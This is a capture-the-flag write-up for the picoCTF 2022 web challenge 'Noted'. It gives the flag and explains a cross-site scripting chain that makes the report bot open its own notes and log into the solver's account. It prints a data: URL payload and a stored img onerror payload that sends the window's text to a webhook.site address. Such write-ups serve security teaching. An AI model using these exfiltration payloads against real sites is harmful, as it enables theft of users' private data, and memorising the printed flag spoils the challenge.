  # picoCTF2022: Noted

![Contest Date: 15.03.2022](https://img.shields.io/badge/Contest%20Date-15.03.2022-lightgrey.svg)
![Solve Moment: During The Contest](https://img.shields.io/badge/Solve%20Moment-During%20The%20Contest-brightgreen.svg)
![Score: 500](https://img.shields.io/badge/Score-500-brightgreen.svg)

## Description

> I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?
Note that the headless browser used for the "report" feature does not have access to the internet.




## Attached Files

- noted.tar.gz

## Flag

```
picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}
```

## Detailed Solution

After looking at the source, it seems that this is a website that allows to create an account, login, and create notes. The notes seem to be private, and only visible to the logged in user, and are not accessible through some URL. Looking at some past challenges and writeups such as [TBDXSS](https://ctftime.org/task/17592) and [XSS On Other Domain](https://www.youtube.com/watch?v=9ecv6ILXrZo). We see that this website is vurlnerable to XSS. The latter video seems especially helpful, because we want to craft a payload to get the flag on another domain. So now let's try to reiterate on what we exactly want to do. We want some payload, which our bot will run to steal it's notes which will contain the flag. However, we need to make the bot run this directly. One ideal plan would be to create a temporary account, and put the XSS Payload that will print the contents of a window of the bot, which will have the flag. And then from the Report function we first open a window which we can later use to read the contents of the bots notes, and getthe flag. Then we can open a window which we can then login to the temporary account we created, and access the notes of the temporary account which will run our payload, and send the flag through a webhook. Now implementing this, we get

```html
data:text/html,<form action="http://0.0.0.0:8080/login" method=POST id=l target=_blank>
<input type="text" name="username" value="t"><input type="text" name="password" value="t">
</form><iframe id=c name=b></iframe><iframe id=d></iframe><script>window.open('http://0.0.0.0:8080/notes%27,'n');setTimeout(`l.submit()`,1000);setTimeout(`window.location='http://0.0.0.0:8080/notes?zz'`,1500)</script>
```
We will use this in our report function.

```html
<img src=x onerror="if(window.location.search.includes('zz'))window.location='https://webhook.site/bc465fa8-238e-4b8b-b771-4fa454413bf5/'+window.open('', 'n').document.body.textContent">
```

We will put this in the notes of our temporary account.

Now trying this out we get this in our webhook, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-04%20at%207.43.03%20PM.png)</p>.

Now URL Decoding this we get our flag :D, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-04%20at%207.45.11%20PM.png)</p>.
